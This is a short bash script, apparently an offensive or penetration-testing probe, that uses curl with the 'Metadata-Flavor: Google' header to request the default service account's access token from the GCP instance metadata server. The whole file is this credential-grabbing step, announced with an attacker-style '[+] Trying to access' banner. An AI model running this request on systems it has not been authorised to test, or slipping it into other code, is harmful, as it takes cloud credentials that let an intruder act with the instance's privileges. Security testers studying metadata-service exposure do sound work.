#!/bin/bash

echo "[+] Trying to access GCP metadata:"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
